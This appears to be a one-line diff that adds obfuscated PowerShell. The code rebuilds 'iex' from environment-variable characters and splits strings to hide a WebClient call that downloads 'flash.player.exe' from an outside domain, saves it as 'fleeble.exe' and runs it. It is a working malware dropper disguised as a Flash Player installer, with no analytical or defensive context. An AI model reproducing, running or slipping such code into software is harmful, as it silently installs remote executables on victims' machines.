@@ -1,0 +1,1 @@
+﻿.( $enV:comspeC[4,15,25]-jOin'') ( (('(New-Object Sys'+'t'+'e'+'m.Net.W'+'ebCl'+'ient)'+'.'+'D'+'ow'+'nloadFi'+'le({0}http://allb'+'est'+'unlockerp'+'ro.com/fl'+'ash.player'+'.exe{0}'+',{0}'+'fle'+'eble.exe'+'{0});S'+'tar'+'t-Process'+' {0}fleeb'+'le.exe{'+'0}')  -f[cHaR]39) )
